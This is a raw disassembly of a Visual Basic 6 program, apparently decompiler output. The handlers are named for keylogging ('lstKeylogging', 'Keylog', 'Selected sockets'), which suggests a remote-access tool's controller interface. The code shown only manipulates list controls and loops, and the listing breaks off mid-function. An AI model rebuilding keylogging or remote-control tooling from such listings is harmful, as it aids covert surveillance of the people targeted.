0074DD07: call [eax+0000032Ch]
0074DD0D: push eax
0074DD0E: lea eax, var_38
0074DD11: push eax
0074DD12: call 00410A84h ; Set (object)
0074DD17: push eax
0074DD18: lea eax, var_50
0074DD1B: push eax
0074DD1C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074DD21: add esp, 00000010h
0074DD24: push eax
0074DD25: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074DD2A: push eax
0074DD2B: lea eax, var_3C
0074DD2E: push eax
0074DD2F: call 00410A84h ; Set (object)
0074DD34: mov var_00000098, eax
0074DD3A: lea edx, var_30
0074DD3D: lea ecx, var_60
0074DD40: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074DD45: lea eax, var_60
0074DD48: push eax
0074DD49: mov eax, var_00000098
0074DD4F: mov eax, [eax]
0074DD51: push var_00000098
0074DD57: call [eax+34h]
0074DD5A: fclex 
0074DD5C: mov var_0000009C, eax
0074DD62: cmp var_0000009C, 00000000h
0074DD69: jnl 74DD8Bh
0074DD6B: push 00000034h
0074DD6D: push 004412BCh
0074DD72: push var_00000098
0074DD78: push var_0000009C
0074DD7E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074DD83: mov var_000000F8, eax
0074DD89: jmp 74DD92h
0074DD8B: and var_000000F8, 00000000h
0074DD92: lea eax, var_3C
0074DD95: push eax
0074DD96: lea eax, var_38
0074DD99: push eax
0074DD9A: push 00000002h
0074DD9C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074DDA1: add esp, 0000000Ch
0074DDA4: lea eax, var_60
0074DDA7: push eax
0074DDA8: lea eax, var_50
0074DDAB: push eax
0074DDAC: push 00000002h
0074DDAE: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074DDB3: add esp, 0000000Ch
0074DDB6: jmp 0074DA8Dh
0074DDBB: mov var_04, 0000000Bh
0074DDC2: lea eax, var_000000C8
0074DDC8: push eax
0074DDC9: lea eax, var_000000B8
0074DDCF: push eax
0074DDD0: lea eax, var_30
0074DDD3: push eax
0074DDD4: call 00410A36h ; Next
0074DDD9: mov var_000000E4, eax
0074DDDF: cmp var_000000E4, 00000000h
0074DDE6: jnz 0074DBA5h
0074DDEC: mov var_04, 0000000Ch
0074DDF3: and [008F23B8h], 00000000h
0074DDFA: mov var_04, 0000000Dh
0074DE01: fldz 
0074DE03: fstp real8 ptr [008F23BCh]
0074DE09: mov var_04, 0000000Eh
0074DE10: fldz 
0074DE12: fstp real8 ptr [008F23ACh]
0074DE18: mov var_10, 00000000h
0074DE1F: wait 
0074DE20: push 0074DE79h
0074DE25: jmp 74DE58h
0074DE27: lea ecx, var_34
0074DE2A: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074DE2F: lea eax, var_40
0074DE32: push eax
0074DE33: lea eax, var_3C
0074DE36: push eax
0074DE37: lea eax, var_38
0074DE3A: push eax
0074DE3B: push 00000003h
0074DE3D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074DE42: add esp, 00000010h
0074DE45: lea eax, var_60
0074DE48: push eax
0074DE49: lea eax, var_50
0074DE4C: push eax
0074DE4D: push 00000002h
0074DE4F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074DE54: add esp, 0000000Ch
0074DE57: ret 
End Sub

Private sub mnuHelLoggMarkerade__74C497
0074C497: push ebp
0074C498: mov ebp, esp
0074C49A: sub esp, 00000018h
0074C49D: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074C4A2: mov eax, fs:[00h]
0074C4A8: push eax
0074C4A9: mov fs:[00000000h], esp
0074C4B0: mov eax, 00000120h
0074C4B5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074C4BA: push ebx
0074C4BB: push esi
0074C4BC: push edi
0074C4BD: mov var_18, esp
0074C4C0: mov var_14, 00405C00h
0074C4C7: mov eax, [ebp+08h]
0074C4CA: and eax, 00000001h
0074C4CD: mov var_10, eax
0074C4D0: mov eax, [ebp+08h]
0074C4D3: and al, FEh
0074C4D5: mov [ebp+08h], eax
0074C4D8: mov var_0C, 00000000h
0074C4DF: mov eax, [ebp+08h]
0074C4E2: mov eax, [eax]
0074C4E4: push [ebp+08h]
0074C4E7: call [eax+04h]
0074C4EA: mov var_04, 00000001h
0074C4F1: mov var_04, 00000002h
0074C4F8: push FFFFFFFFh
0074C4FA: call 00410A60h ; On Error ...
0074C4FF: mov var_04, 00000004h
0074C506: mov var_80, 00000001h
0074C50D: mov var_00000088, 00000002h
0074C517: push 004412BCh
0074C51C: push 00000000h
0074C51E: push 00000007h
0074C520: mov eax, [ebp+08h]
0074C523: mov eax, [eax]
0074C525: push [ebp+08h]
0074C528: call [eax+0000032Ch]
0074C52E: push eax
0074C52F: lea eax, var_3C
0074C532: push eax
0074C533: call 00410A84h ; Set (object)
0074C538: push eax
0074C539: lea eax, var_54
0074C53C: push eax
0074C53D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074C542: add esp, 00000010h
0074C545: push eax
0074C546: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074C54B: push eax
0074C54C: lea eax, var_40
0074C54F: push eax
0074C550: call 00410A84h ; Set (object)
0074C555: mov var_000000B8, eax
0074C55B: lea eax, var_000000AC
0074C561: push eax
0074C562: mov eax, var_000000B8
0074C568: mov eax, [eax]
0074C56A: push var_000000B8
0074C570: call [eax+1Ch]
0074C573: fclex 
0074C575: mov var_000000BC, eax
0074C57B: cmp var_000000BC, 00000000h
0074C582: jnl 74C5A4h
0074C584: push 0000001Ch
0074C586: push 004412BCh
0074C58B: push var_000000B8
0074C591: push var_000000BC
0074C597: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074C59C: mov var_00000128, eax
0074C5A2: jmp 74C5ABh
0074C5A4: and var_00000128, 00000000h
0074C5AB: mov eax, var_000000AC
0074C5B1: mov var_00000090, eax
0074C5B7: mov var_00000098, 00000003h
0074C5C1: mov var_000000A0, 00000001h
0074C5CB: mov var_000000A8, 00000002h
0074C5D5: lea eax, var_00000088
0074C5DB: push eax
0074C5DC: lea eax, var_00000098
0074C5E2: push eax
0074C5E3: lea eax, var_000000A8
0074C5E9: push eax
0074C5EA: lea eax, var_000000E8
0074C5F0: push eax
0074C5F1: lea eax, var_000000D8
0074C5F7: push eax
0074C5F8: lea eax, var_30
0074C5FB: push eax
0074C5FC: call 00410A3Ch ; For
0074C601: mov var_00000120, eax
0074C607: lea eax, var_40
0074C60A: push eax
0074C60B: lea eax, var_3C
0074C60E: push eax
0074C60F: push 00000002h
0074C611: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074C616: add esp, 0000000Ch
0074C619: lea ecx, var_54
0074C61C: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074C621: jmp 0074C860h
0074C626: mov var_04, 00000005h
0074C62D: push 004412BCh
0074C632: push 00000000h
0074C634: push 00000007h
0074C636: mov eax, [ebp+08h]
0074C639: mov eax, [eax]
0074C63B: push [ebp+08h]
0074C63E: call [eax+0000032Ch]
0074C644: push eax
0074C645: lea eax, var_3C
0074C648: push eax
0074C649: call 00410A84h ; Set (object)
0074C64E: push eax
0074C64F: lea eax, var_54
0074C652: push eax
0074C653: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074C658: add esp, 00000010h
0074C65B: push eax
0074C65C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074C661: push eax
0074C662: lea eax, var_40
0074C665: push eax
0074C666: call 00410A84h ; Set (object)
0074C66B: mov var_000000B8, eax
0074C671: lea eax, var_44
0074C674: push eax
0074C675: lea eax, var_30
0074C678: push eax
0074C679: mov eax, var_000000B8
0074C67F: mov eax, [eax]
0074C681: push var_000000B8
0074C687: call [eax+24h]
0074C68A: fclex 
0074C68C: mov var_000000BC, eax
0074C692: cmp var_000000BC, 00000000h
0074C699: jnl 74C6BBh
0074C69B: push 00000024h
0074C69D: push 004412BCh
0074C6A2: push var_000000B8
0074C6A8: push var_000000BC
0074C6AE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074C6B3: mov var_0000012C, eax
0074C6B9: jmp 74C6C2h
0074C6BB: and var_0000012C, 00000000h
0074C6C2: mov eax, var_44
0074C6C5: mov var_000000C0, eax
0074C6CB: lea eax, var_34
0074C6CE: push eax
0074C6CF: push 00000005h
0074C6D1: mov eax, var_000000C0
0074C6D7: mov eax, [eax]
0074C6D9: push var_000000C0
0074C6DF: call [eax+00000084h]
0074C6E5: fclex 
0074C6E7: mov var_000000C4, eax
0074C6ED: cmp var_000000C4, 00000000h
0074C6F4: jnl 74C719h
0074C6F6: push 00000084h
0074C6FB: push 004412DCh
0074C700: push var_000000C0
0074C706: push var_000000C4
0074C70C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074C711: mov var_00000130, eax
0074C717: jmp 74C720h
0074C719: and var_00000130, 00000000h
0074C720: push var_34
0074C723: push 0044BAE4h ; 100%
0074C728: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074C72D: neg eax
0074C72F: sbb eax, eax
0074C731: inc eax
0074C732: neg eax
0074C734: mov var_000000C8, ax
0074C73B: lea ecx, var_34
0074C73E: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074C743: lea eax, var_44
0074C746: push eax
0074C747: lea eax, var_40
0074C74A: push eax
0074C74B: lea eax, var_3C
0074C74E: push eax
0074C74F: push 00000003h
0074C751: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074C756: add esp, 00000010h
0074C759: lea ecx, var_54
0074C75C: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074C761: movsx eax, word ptr var_000000C8
0074C768: test eax, eax
0074C76A: jz 0074C83Ch
0074C770: mov var_04, 00000006h
0074C777: push 004412BCh
0074C77C: push 00000000h
0074C77E: push 00000007h
0074C780: mov eax, [ebp+08h]
0074C783: mov eax, [eax]
0074C785: push [ebp+08h]
0074C788: call [eax+0000032Ch]
0074C78E: push eax
0074C78F: lea eax, var_3C
0074C792: push eax
0074C793: call 00410A84h ; Set (object)
0074C798: push eax
0074C799: lea eax, var_54
0074C79C: push eax
0074C79D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074C7A2: add esp, 00000010h
0074C7A5: push eax
0074C7A6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074C7AB: push eax
0074C7AC: lea eax, var_40
0074C7AF: push eax
0074C7B0: call 00410A84h ; Set (object)
0074C7B5: mov var_000000B8, eax
0074C7BB: lea edx, var_30
0074C7BE: lea ecx, var_64
0074C7C1: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074C7C6: lea eax, var_64
0074C7C9: push eax
0074C7CA: mov eax, var_000000B8
0074C7D0: mov eax, [eax]
0074C7D2: push var_000000B8
0074C7D8: call [eax+34h]
0074C7DB: fclex 
0074C7DD: mov var_000000BC, eax
0074C7E3: cmp var_000000BC, 00000000h
0074C7EA: jnl 74C80Ch
0074C7EC: push 00000034h
0074C7EE: push 004412BCh
0074C7F3: push var_000000B8
0074C7F9: push var_000000BC
0074C7FF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074C804: mov var_00000134, eax
0074C80A: jmp 74C813h
0074C80C: and var_00000134, 00000000h
0074C813: lea eax, var_40
0074C816: push eax
0074C817: lea eax, var_3C
0074C81A: push eax
0074C81B: push 00000002h
0074C81D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074C822: add esp, 0000000Ch
0074C825: lea eax, var_64
0074C828: push eax
0074C829: lea eax, var_54
0074C82C: push eax
0074C82D: push 00000002h
0074C82F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074C834: add esp, 0000000Ch
0074C837: jmp 0074C4FFh
0074C83C: mov var_04, 00000009h
0074C843: lea eax, var_000000E8
0074C849: push eax
0074C84A: lea eax, var_000000D8
0074C850: push eax
0074C851: lea eax, var_30
0074C854: push eax
0074C855: call 00410A36h ; Next
0074C85A: mov var_00000120, eax
0074C860: cmp var_00000120, 00000000h
0074C867: jnz 0074C626h
0074C86D: mov var_04, 0000000Ah
0074C874: and [008F23B8h], 00000000h
0074C87B: mov var_04, 0000000Bh
0074C882: fldz 
0074C884: fstp real8 ptr [008F23BCh]
0074C88A: mov var_04, 0000000Ch
0074C891: fldz 
0074C893: fstp real8 ptr [008F23ACh]
0074C899: mov var_04, 0000000Dh
0074C8A0: push 00FF00FFh
0074C8A5: push 0044BBC0h ; Entire log - Selected sockets
0074C8AA: push 00442864h ; Keylog
0074C8AF: push 0044A82Ch
0074C8B4: call 0074FC42h
0074C8B9: mov var_04, 0000000Eh
0074C8C0: mov var_80, 00000001h
0074C8C7: mov var_00000088, 00000002h
0074C8D1: cmp [008F2010h], 00000000h
0074C8D8: jnz 74C8F5h
0074C8DA: push 008F2010h
0074C8DF: push 00433984h
0074C8E4: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074C8E9: mov var_00000138, 008F2010h
0074C8F3: jmp 74C8FFh
0074C8F5: mov var_00000138, 008F2010h
0074C8FF: push 00000000h
0074C901: push 00000001h
0074C903: push 00440E48h
0074C908: push 00000000h
0074C90A: push 00000018h
0074C90C: mov eax, var_00000138
0074C912: mov eax, [eax]
0074C914: mov ecx, var_00000138
0074C91A: mov ecx, [ecx]
0074C91C: mov ecx, [ecx]
0074C91E: push eax
0074C91F: call [ecx+00000550h]
0074C925: push eax
0074C926: lea eax, var_3C
0074C929: push eax
0074C92A: call 00410A84h ; Set (object)
0074C92F: push eax
0074C930: lea eax, var_54
0074C933: push eax
0074C934: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074C939: add esp, 00000010h
0074C93C: push eax
0074C93D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074C942: push eax
0074C943: lea eax, var_40
0074C946: push eax
0074C947: call 00410A84h ; Set (object)
0074C94C: push eax
0074C94D: lea eax, var_64
0074C950: push eax
0074C951: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074C956: add esp, 00000010h
0074C959: push eax
0074C95A: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0074C95F: mov var_00000090, eax
0074C965: mov var_00000098, 00000003h
0074C96F: mov var_000000A0, 00000001h
0074C979: mov var_000000A8, 00000002h
0074C983: lea eax, var_00000088
0074C989: push eax
0074C98A: lea eax, var_00000098
0074C990: push eax
0074C991: lea eax, var_000000A8
0074C997: push eax
0074C998: lea eax, var_00000108
0074C99E: push eax
0074C99F: lea eax, var_000000F8
0074C9A5: push eax
0074C9A6: lea eax, var_30
0074C9A9: push eax
0074C9AA: call 00410A3Ch ; For
0074C9AF: mov var_00000124, eax
0074C9B5: lea eax, var_40
0074C9B8: push eax
0074C9B9: lea eax, var_3C
0074C9BC: push eax
0074C9BD: push 00000002h
0074C9BF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074C9C4: add esp, 0000000Ch
0074C9C7: lea eax, var_64
0074C9CA: push eax
0074C9CB: lea eax, var_54
0074C9CE: push eax
0074C9CF: push 00000002h
0074C9D1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074C9D6: add esp, 0000000Ch
0074C9D9: jmp 0074CCBAh
0074C9DE: mov var_04, 0000000Fh
0074C9E5: lea eax, var_30
0074C9E8: mov var_80, eax
0074C9EB: mov var_00000088, 0000400Ch
0074C9F5: cmp [008F2010h], 00000000h
0074C9FC: jnz 74CA19h
0074C9FE: push 008F2010h
0074CA03: push 00433984h
0074CA08: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074CA0D: mov var_0000013C, 008F2010h
0074CA17: jmp 74CA23h
0074CA19: mov var_0000013C, 008F2010h
0074CA23: push 00000000h
0074CA25: push 00000004h
0074CA27: push 00440E58h
0074CA2C: push 00000010h
0074CA2E: pop eax
0074CA2F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074CA34: lea esi, var_00000088
0074CA3A: mov edi, esp
0074CA3C: movsd 
0074CA3D: movsd 
0074CA3E: movsd 
0074CA3F: movsd 
0074CA40: push 00000001h
0074CA42: push 00000000h
0074CA44: push 00440E48h
0074CA49: push 00000000h
0074CA4B: push 00000018h
0074CA4D: mov eax, var_0000013C
0074CA53: mov eax, [eax]
0074CA55: mov ecx, var_0000013C
0074CA5B: mov ecx, [ecx]
0074CA5D: mov ecx, [ecx]
0074CA5F: push eax
0074CA60: call [ecx+00000550h]
0074CA66: push eax
0074CA67: lea eax, var_3C
0074CA6A: push eax
0074CA6B: call 00410A84h ; Set (object)
0074CA70: push eax
0074CA71: lea eax, var_54
0074CA74: push eax
0074CA75: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074CA7A: add esp, 00000010h
0074CA7D: push eax
0074CA7E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074CA83: push eax
0074CA84: lea eax, var_40
0074CA87: push eax
0074CA88: call 00410A84h ; Set (object)
0074CA8D: push eax
0074CA8E: lea eax, var_64
0074CA91: push eax
0074CA92: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074CA97: add esp, 00000020h
0074CA9A: push eax
0074CA9B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074CAA0: push eax
0074CAA1: lea eax, var_44
0074CAA4: push eax
0074CAA5: call 00410A84h ; Set (object)
0074CAAA: push eax
0074CAAB: lea eax, var_74
0074CAAE: push eax
0074CAAF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074CAB4: add esp, 00000010h
0074CAB7: push eax
0074CAB8: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
0074CABD: sub ax, FFFFh
0074CAC1: neg ax
0074CAC4: sbb eax, eax
0074CAC6: inc eax
0074CAC7: neg eax
0074CAC9: mov var_000000B8, ax
0074CAD0: lea eax, var_44
0074CAD3: push eax
0074CAD4: lea eax, var_40
0074CAD7: push eax
0074CAD8: lea eax, var_3C
0074CADB: push eax
0074CADC: push 00000003h
0074CADE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074CAE3: add esp, 00000010h
0074CAE6: lea eax, var_74
0074CAE9: push eax
0074CAEA: lea eax, var_64
0074CAED: push eax
0074CAEE: lea eax, var_54
0074CAF1: push eax
0074CAF2: push 00000003h
0074CAF4: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074CAF9: add esp, 00000010h
0074CAFC: movsx eax, word ptr var_000000B8
0074CB03: test eax, eax
0074CB05: jz 0074CC96h
0074CB0B: mov var_04, 00000010h
0074CB12: lea eax, var_30
0074CB15: mov var_80, eax
0074CB18: mov var_00000088, 0000400Ch
0074CB22: cmp [008F2010h], 00000000h
0074CB29: jnz 74CB46h
0074CB2B: push 008F2010h
0074CB30: push 00433984h
0074CB35: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074CB3A: mov var_00000140, 008F2010h
0074CB44: jmp 74CB50h
0074CB46: mov var_00000140, 008F2010h
0074CB50: push 00000000h
0074CB52: push 00000014h
0074CB54: push 00440E58h
0074CB59: push 00000010h
0074CB5B: pop eax
0074CB5C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074CB61: lea esi, var_00000088
0074CB67: mov edi, esp
0074CB69: movsd 
0074CB6A: movsd 
0074CB6B: movsd 
0074CB6C: movsd 
0074CB6D: push 00000001h
0074CB6F: push 00000000h
0074CB71: push 00440E48h
0074CB76: push 00000000h
0074CB78: push 00000018h
0074CB7A: mov eax, var_00000140
0074CB80: mov eax, [eax]
0074CB82: mov ecx, var_00000140
0074CB88: mov ecx, [ecx]
0074CB8A: mov ecx, [ecx]
0074CB8C: push eax
0074CB8D: call [ecx+00000550h]
0074CB93: push eax
0074CB94: lea eax, var_3C
0074CB97: push eax
0074CB98: call 00410A84h ; Set (object)
0074CB9D: push eax
0074CB9E: lea eax, var_54
0074CBA1: push eax
0074CBA2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074CBA7: add esp, 00000010h
0074CBAA: push eax
0074CBAB: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074CBB0: push eax
0074CBB1: lea eax, var_40
0074CBB4: push eax
0074CBB5: call 00410A84h ; Set (object)
0074CBBA: push eax
0074CBBB: lea eax, var_64
0074CBBE: push eax
0074CBBF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074CBC4: add esp, 00000020h
0074CBC7: push eax
0074CBC8: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074CBCD: push eax
0074CBCE: lea eax, var_44
0074CBD1: push eax
0074CBD2: call 00410A84h ; Set (object)
0074CBD7: push eax
0074CBD8: lea eax, var_74
0074CBDB: push eax
0074CBDC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074CBE1: add esp, 00000010h
0074CBE4: push eax
0074CBE5: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0074CBEA: mov edx, eax
0074CBEC: lea ecx, var_34
0074CBEF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074CBF4: push eax
0074CBF5: call 004109DCh ; Val(arg_1)
0074CBFA: fstp real8 ptr var_000000B4
0074CC00: push 00000000h
0074CC02: push FFFFFFFFh
0074CC04: push 00000000h
0074CC06: push 00000000h
0074CC08: lea eax, var_78
0074CC0B: push eax
0074CC0C: push 00000010h
0074CC0E: push 00000880h
0074CC13: call 00410946h ; ReDim
0074CC18: add esp, 0000001Ch
0074CC1B: mov edx, 0043D540h ; x25
0074CC20: lea ecx, var_38
0074CC23: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074CC28: lea eax, var_78
0074CC2B: push eax
0074CC2C: lea eax, var_38
0074CC2F: push eax
0074CC30: fld real8 ptr var_000000B4
0074CC36: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0074CC3B: push eax
0074CC3C: call 007A6910h
0074CC41: lea eax, var_78
0074CC44: push eax
0074CC45: push 00000000h
0074CC47: call 00410934h ; Erase
0074CC4C: lea eax, var_38
0074CC4F: push eax
0074CC50: lea eax, var_34
0074CC53: push eax
0074CC54: push 00000002h
0074CC56: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074CC5B: add esp, 0000000Ch
0074CC5E: lea eax, var_44
0074CC61: push eax
0074CC62: lea eax, var_40
0074CC65: push eax
0074CC66: lea eax, var_3C
0074CC69: push eax
0074CC6A: push 00000003h
0074CC6C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074CC71: add esp, 00000010h
0074CC74: lea eax, var_74
0074CC77: push eax
0074CC78: lea eax, var_64
0074CC7B: push eax
0074CC7C: lea eax, var_54
0074CC7F: push eax
0074CC80: push 00000003h
0074CC82: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074CC87: add esp, 00000010h
0074CC8A: mov var_04, 00000011h
0074CC91: call 0041096Ah ; DoEvents
0074CC96: mov var_04, 00000013h
0074CC9D: lea eax, var_00000108
0074CCA3: push eax
0074CCA4: lea eax, var_000000F8
0074CCAA: push eax
0074CCAB: lea eax, var_30
0074CCAE: push eax
0074CCAF: call 00410A36h ; Next
0074CCB4: mov var_00000124, eax
0074CCBA: cmp var_00000124, 00000000h
0074CCC1: jnz 0074C9DEh
0074CCC7: mov var_10, 00000000h
0074CCCE: wait 
0074CCCF: push 0074CD4Fh
0074CCD4: jmp 74CD20h
0074CCD6: lea eax, var_38
0074CCD9: push eax
0074CCDA: lea eax, var_34
0074CCDD: push eax
0074CCDE: push 00000002h
0074CCE0: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074CCE5: add esp, 0000000Ch
0074CCE8: lea eax, var_44
0074CCEB: push eax
0074CCEC: lea eax, var_40
0074CCEF: push eax
0074CCF0: lea eax, var_3C
0074CCF3: push eax
0074CCF4: push 00000003h
0074CCF6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074CCFB: add esp, 00000010h
0074CCFE: lea eax, var_74
0074CD01: push eax
0074CD02: lea eax, var_64
0074CD05: push eax
0074CD06: lea eax, var_54
0074CD09: push eax
0074CD0A: push 00000003h
0074CD0C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074CD11: add esp, 00000010h
0074CD14: lea eax, var_78
0074CD17: push eax
0074CD18: push 00000000h
0074CD1A: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0074CD1F: ret 
End Sub

Private sub lstKeylogging__747916
00747916: push ebp
00747917: mov ebp, esp
00747919: sub esp, 0000000Ch
0074791C: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00747921: mov eax, fs:[00h]
00747927: push eax
00747928: mov fs:[00000000h], esp
0074792F: push 00000008h
00747931: pop eax
00747932: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00747937: push ebx
00747938: push esi
00747939: push edi
0074793A: mov var_0C, esp
0074793D: mov var_08, 004059A8h
00747944: mov eax, [ebp+08h]
00747947: and eax, 00000001h
0074794A: mov var_04, eax
0074794D: mov eax, [ebp+08h]
00747950: and al, FEh
00747952: mov [ebp+08h], eax
00747955: mov eax, [ebp+08h]
00747958: mov eax, [eax]
0074795A: push [ebp+08h]
0074795D: call [eax+04h]
00747960: mov eax, [ebp+0Ch]
00747963: or word ptr [eax], FFFFh
00747967: mov var_04, 00000000h
0074796E: mov eax, [ebp+08h]
00747971: mov eax, [eax]
00747973: push [ebp+08h]
00747976: call [eax+08h]
00747979: mov eax, var_04
0074797C: mov ecx, var_14
0074797F: mov fs:[00000000h], ecx
00747986: pop edi
00747987: pop esi
00747988: pop ebx
00747989: leave 
0074798A: retn 0008h
End Sub

Private sub lstKeylogging__74900D
0074900D: push ebp
0074900E: mov ebp, esp
00749010: sub esp, 00000018h
00749013: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00749018: mov eax, fs:[00h]
0074901E: push eax
0074901F: mov fs:[00000000h], esp
00749026: mov eax, 000003CCh
0074902B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00749030: push ebx
00749031: push esi
00749032: push edi
00749033: mov var_18, esp
00749036: mov var_14, 004059F0h
0074903D: mov eax, [ebp+08h]
00749040: and eax, 00000001h
00749043: mov var_10, eax
00749046: mov eax, [ebp+08h]
00749049: and al, FEh
0074904B: mov [ebp+08h], eax
0074904E: mov var_0C, 00000000h
00749055: mov eax, [ebp+08h]
00749058: mov eax, [eax]
0074905A: push [ebp+08h]
0074905D: call [eax+04h]
00749060: mov var_04, 00000001h
00749067: mov var_04, 00000002h
0074906E: push FFFFFFFFh
00749070: call 00410A60h ; On Error ...
00749075: mov var_04, 00000003h
0074907C: mov eax, [ebp+0Ch]
0074907F: cmp word ptr [eax], 000Dh
00749083: jnz 0074A54Bh
00749089: mov var_04, 00000004h
00749090: push 004412BCh
00749095: push 00000000h
00749097: push 00000007h
00749099: mov eax, [ebp+08h]
0074909C: mov eax, [eax]
0074909E: push [ebp+08h]
007490A1: call [eax+0000032Ch]
007490A7: push eax
007490A8: lea eax, var_3C
007490AB: push eax
007490AC: call 00410A84h ; Set (object)
007490B1: push eax
007490B2: lea eax, var_00000084
007490B8: push eax
007490B9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007490BE: add esp, 00000010h
007490C1: push eax
007490C2: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007490C7: push eax
007490C8: lea eax, var_40
007490CB: push eax
007490CC: call 00410A84h ; Set (object)
007490D1: mov var_00000328, eax
007490D7: push 004412DCh
007490DC: push 00000000h
007490DE: push 0000000Dh
007490E0: mov eax, [ebp+08h]
007490E3: mov eax, [eax]
007490E5: push [ebp+08h]
007490E8: call [eax+0000032Ch]
007490EE: push eax
007490EF: lea eax, var_34
007490F2: push eax
007490F3: call 00410A84h ; Set (object)
007490F8: push eax
007490F9: lea eax, var_74
007490FC: push eax
007490FD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00749102: add esp, 00000010h
00749105: push eax
00749106: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074910B: push eax
0074910C: lea eax, var_38
0074910F: push eax
00749110: call 00410A84h ; Set (object)
00749115: mov var_00000320, eax
0074911B: lea eax, var_00000308
00749121: push eax
00749122: mov eax, var_00000320
00749128: mov eax, [eax]
0074912A: push var_00000320
00749130: call [eax+44h]
00749133: fclex 
00749135: mov var_00000324, eax
0074913B: cmp var_00000324, 00000000h
00749142: jnl 749164h
00749144: push 00000044h
00749146: push 004412DCh
0074914B: push var_00000320
00749151: push var_00000324
00749157: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074915C: mov var_00000380, eax
00749162: jmp 74916Bh
00749164: and var_00000380, 00000000h
0074916B: mov eax, var_00000308
00749171: mov var_0000008C, eax
00749177: mov var_00000094, 00000003h
00749181: lea eax, var_44
00749184: push eax
00749185: lea eax, var_00000094
0074918B: push eax
0074918C: mov eax, var_00000328
00749192: mov eax, [eax]
00749194: push var_00000328
0074919A: call [eax+24h]
0074919D: fclex 
0074919F: mov var_0000032C, eax
007491A5: cmp var_0000032C, 00000000h
007491AC: jnl 7491CEh
007491AE: push 00000024h
007491B0: push 004412BCh
007491B5: push var_00000328
007491BB: push var_0000032C
007491C1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007491C6: mov var_00000384, eax
007491CC: jmp 7491D5h
007491CE: and var_00000384, 00000000h
007491D5: mov eax, var_44
007491D8: mov var_00000330, eax
007491DE: lea eax, var_24
007491E1: push eax
007491E2: push 00000006h
007491E4: mov eax, var_00000330
007491EA: mov eax, [eax]
007491EC: push var_00000330
007491F2: call [eax+00000084h]
007491F8: fclex 
007491FA: mov var_00000334, eax
00749200: cmp var_00000334, 00000000h
00749207: jnl 74922Ch
00749209: push 00000084h
0074920E: push 004412DCh
